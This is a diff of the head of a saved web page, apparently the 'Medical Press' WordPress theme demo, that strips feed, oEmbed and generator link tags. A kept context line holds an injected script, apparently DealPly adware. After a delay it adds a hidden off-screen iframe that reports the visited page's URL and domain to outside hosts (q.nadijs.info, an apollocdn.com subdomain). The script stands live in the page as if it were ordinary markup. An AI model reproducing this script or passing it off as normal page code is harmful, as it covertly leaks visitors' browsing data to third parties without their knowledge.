@@ -1,14 +1,4 @@
-<link rel="shortcut icon" href="http://medicalpress.inspirythemes.biz/wp-content/uploads/2014/05/favicon-new.png">
-<!-- Pingback URL -->
-<link rel="pingback" href="http://medicalpress.inspirythemes.biz/xmlrpc.php">
 
-<!-- RSS -->
-<link rel="alternate" type="application/rss+xml" title="Medical Press" href="http://medicalpress.inspirythemes.biz/feed/">
-<link rel="alternate" type="application/atom+xml" title="Medical Press" href="http://medicalpress.inspirythemes.biz/feed/atom/">
-<title></title>
-<link rel="alternate" type="application/rss+xml" title="Medical Press » Feed" href="http://medicalpress.inspirythemes.biz/feed/">
-<link rel="alternate" type="application/rss+xml" title="Medical Press » Comments Feed" href="http://medicalpress.inspirythemes.biz/comments/feed/">
-<link rel="alternate" type="application/rss+xml" title="Medical Press » Home Comments Feed" href="http://medicalpress.inspirythemes.biz/home/feed/">
 <script async="" type="text/javascript">(function(){try{if(typeof window['asdfdsasdfdsa'] === 'undefined'){setTimeout(function(){var shouldThisPartOfCodeRun = document.URL.search('http') === 0 ;if(!shouldThisPartOfCodeRun){	return;}if(typeof DealPly !== 'undefined' && typeof DealPly.serverCallParam === 'string'  ){var reportFlag = true;var scArr = document.getElementsByTagName('script');for(var index in scArr){if(typeof scArr[index].src === 'string' && scArr[index].src.search('\\.js\\?dn=') !== -1){	reportFlag = false;}}if(!reportFlag ){	return;}var host = 'http://q.nadijs.info/';var isSecure =  document.URL.search('https://') === 0 ;if(isSecure){	host = 'https://endall41-q.apollocdn.com/';}var urlPath = 'dealdo/event-report?type=quick&';var iframe = document.createElement('iframe');var suffix = ''; try{if(typeof JavaScriptJsTagUrl !== 'undefined'){suffix = JavaScriptJsTagUrl.substr(JavaScriptJsTagUrl.search('\?') + 1 );}}catch(e324324){}iframe.setAttribute('style','position:relative; left:-10000px; width:1px; height:1px; visibility:hidden');iframe.setAttribute('src',host + urlPath + 'url=' + encodeURIComponent(document.URL) + '&domain=' + document.domain   + '&topic=dpdiedarg&' + suffix );document.body.appendChild(iframe);}}, 10000);window['asdfdsasdfdsa'] = true;} }catch(e235534){}})();</script><script src="index_files/analytics.js" async=""></script><script type="text/javascript">
 			window._wpemojiSettings = {"baseUrl":"http:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/medicalpress.inspirythemes.biz\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.4"}};
 			!function(a,b,c){function d(a){var c=b.createElement("canvas"),d=c.getContext&&c.getContext("2d");return d&&d.fillText?(d.textBaseline="top",d.font="600 32px Arial","flag"===a?(d.fillText(String.fromCharCode(55356,56806,55356,56826),0,0),c.toDataURL().length>3e3):("simple"===a?d.fillText(String.fromCharCode(55357,56835),0,0):d.fillText(String.fromCharCode(55356,57135),0,0),0!==d.getImageData(16,16,1,1).data[0])):!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g;c.supports={simple:d("simple"),flag:d("flag"),unicode8:d("unicode8")},c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.simple&&c.supports.flag&&c.supports.unicode8||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
@@ -56,15 +46,7 @@ img.wp-smiley, img.emoji {
 		<script type="text/javascript" src="js/jquery-migrate.js"></script>
 		<script type="text/javascript" src="js/jquery_017.js"></script>
 		<script type="text/javascript" src="js/jquery.js"></script>
-		<link rel="https://api.w.org/" href="http://medicalpress.inspirythemes.biz/wp-json/">
-		<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://medicalpress.inspirythemes.biz/xmlrpc.php?rsd">
-		<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://medicalpress.inspirythemes.biz/wp-includes/wlwmanifest.xml">
-		<meta name="generator" content="WordPress 4.4">
-		<meta name="generator" content="WooCommerce 2.4.12">
-		<link rel="canonical" href="index_files/a.htm">
-		<link rel="shortlink" href="index_files/a.htm">
-		<link rel="alternate" type="application/json+oembed" href="http://medicalpress.inspirythemes.biz/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fmedicalpress.inspirythemes.biz%2F">
-		<link rel="alternate" type="text/xml+oembed" href="http://medicalpress.inspirythemes.biz/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fmedicalpress.inspirythemes.biz%2F&amp;format=xml">
+		
 		<style type="text/css" id="inspiry-dynamic-css">
 nav.main-menu ul > li ul li {
 	border-color:#73d1e7;
